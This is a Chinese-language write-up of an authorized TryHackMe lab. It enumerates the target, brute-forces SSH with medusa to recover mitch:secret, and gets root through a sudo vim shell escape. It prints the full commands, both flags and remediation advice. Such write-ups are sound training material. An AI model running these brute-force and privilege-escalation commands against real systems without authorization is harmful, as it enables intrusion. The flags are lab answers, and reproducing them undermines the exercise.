# THM 10.48.160.212 渗透测试 Writeup

**日期**: 2026-06-03
**测试者**: yao
**目标**: 10.48.160.212
**平台**: TryHackMe 授权靶场
**耗时**: ~30 分钟
**状态**: ✅ 全部完成 (2/2 Flags)

---

## 1. 信息搜集

### 1.1 端口扫描
由于目标存在防火墙欺骗（对所有端口响应 open），采用定向端口扫描策略：

```bash
nmap -sS -p21,22,80,2222 -T4 --open 10.48.160.212
```

**结果**：
| 端口     | 状态 | 服务 | 版本                   |
| -------- | ---- | ---- | ---------------------- |
| 21/tcp   | open | FTP  | vsftpd 3.0.3           |
| 80/tcp   | open | HTTP | Apache 2.4.18 (Ubuntu) |
| 2222/tcp | open | SSH  | OpenSSH 7.2p2          |

### 1.2 Web 枚举
使用 gobuster 进行目录爆破：

```bash
gobuster dir -u http://10.48.160.212 -w /usr/share/wordlists/dirb/common.txt
```

**发现**：
- `/simple/` → CMS Made Simple 2.2.8
- `/simple/admin/login.php` → 后台登录
- robots.txt → 默认 CUPS 配置（干扰信息）

### 1.3 FTP 匿名枚举
```bash
ftp anonymous@10.48.160.212
```

**注意**：被动模式（PASV）连接超时，需切换为主动模式（PORT）或关闭被动模式。

**发现文件**：`pub/ForMitch.txt`

**文件内容**：
> Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

**分析**：
- 开发者为 mitch
- 系统用户密码与某处密码相同
- 密码非常弱

---

## 2. 凭据获取

### 2.1 用户名推断
从文件名 `ForMitch.txt` 和内容推断：
- **用户名**: `mitch`

### 2.2 SSH 密码爆破
使用 medusa 对 SSH (2222端口) 进行弱密码爆破：

```bash
medusa -h 10.48.160.212 -n 2222 -u mitch -P /tmp/weak_passwords.txt -M ssh -t 10
```

**结果**（约3秒破解成功）：
```
ACCOUNT FOUND: [ssh] Host: 10.48.160.212 User: mitch Password: secret [SUCCESS]
```

**凭据**：
- 用户名: `mitch`
- 密码: `secret`
- 服务: SSH (2222端口)

---

## 3. 初始访问

### 3.1 SSH 登录
```bash
ssh -p 2222 mitch@10.48.160.212
```

**系统信息**：
- OS: Ubuntu 16.04.6 LTS
- Kernel: Linux 4.15.0-58-generic i686
- 用户: mitch (uid=1001)

### 3.2 User Flag
```bash
cat ~/user.txt
```

**Flag**: `G00d j0b, keep up!`

---

## 4. 权限提升

### 4.1 Sudo 权限检查
```bash
sudo -l
```

**结果**：
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

**分析**：mitch 用户可无密码 sudo 执行 vim，这是一个经典的权限提升向量。

### 4.2 Vim 提权
利用 vim 的 `:!/bin/bash` 命令执行功能：

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

或：
```bash
sudo vim
# 在 vim 中输入 :!/bin/bash
```

**结果**：成功获取 root shell

### 4.3 Root Flag
```bash
cat /root/root.txt
```

**Flag**: `W3ll d0n3. You made it!`

---

## 5. 攻击路径总结

```
[信息搜集]
  └── Nmap 扫描 → 发现 21/80/2222 端口
      └── FTP 匿名登录 → ForMitch.txt (凭据提示)
          └── Medusa 爆破 → mitch:secret
              └── SSH 登录 (2222) → mitch 权限
                  └── sudo -l → NOPASSWD: /usr/bin/vim
                      └── sudo vim → :!/bin/bash → ROOT
                          └── root flag
```

---

## 6. 漏洞分析

### 6.1 漏洞列表

| 漏洞          | 风险等级 | 说明                              |
| ------------- | -------- | --------------------------------- |
| FTP 匿名访问  | 中       | vsftpd 允许匿名登录，泄露敏感文件 |
| 弱密码        | 高       | 密码 "secret" 过于简单，3秒破解   |
| 密码复用      | 高       | 系统用户密码与其他服务密码相同    |
| Sudo 配置不当 | 高       | vim 赋予 root 权限且无密码验证    |

### 6.2 修复建议

1. **禁用 FTP 匿名访问**
   - 修改 vsftpd.conf：`anonymous_enable=NO`

2. **强制强密码策略**
   - 使用密码复杂度要求
   - 定期更换密码

3. **分离服务密码与系统密码**
   - 不同服务使用不同凭据
   - 避免密码复用

4. **限制 sudo 权限**
   - 移除 vim 的 sudo 权限
   - 如需使用，配置为需要密码验证
   - 使用 visudo 精细化权限控制

---

## 7. 技术细节

### 7.1 工具使用
- **Nmap**: 端口扫描与服务识别
- **Gobuster**: Web 目录爆破
- **Medusa**: SSH 密码爆破
- **Vim**: 权限提升向量

### 7.2 关键命令速查
```bash
# 端口扫描
nmap -sS -p21,22,80,2222 -T4 --open 10.48.160.212

# Web 目录爆破
gobuster dir -u http://10.48.160.212 -w /usr/share/wordlists/dirb/common.txt

# SSH 爆破
medusa -h 10.48.160.212 -n 2222 -u mitch -P wordlist.txt -M ssh -t 10

# 权限提升
sudo /usr/bin/vim -c ':!/bin/bash'
```

---

## 8. 时间线

| 时间  | 动作          | 结果              |
| ----- | ------------- | ----------------- |
| T+0m  | Nmap 初始扫描 | 发现端口          |
| T+5m  | FTP 匿名枚举  | 获取 ForMitch.txt |
| T+8m  | SSH 密码爆破  | 获取 mitch:secret |
| T+10m | SSH 登录      | 获取 user flag    |
| T+15m | Sudo 检查     | 发现 vim 提权     |
| T+20m | 权限提升      | 获取 root flag    |

---

## 9. 参考

- [GTFOBins - Vim](https://gtfobins.github.io/gtfobins/vim/)
- [CMS Made Simple 2.2.8](https://www.cmsmadesimple.org/)
- [THM 靶场指南](https://tryhackme.com/)

---

**文档状态**: ✅ 完成
**最后更新**: 2026-06-03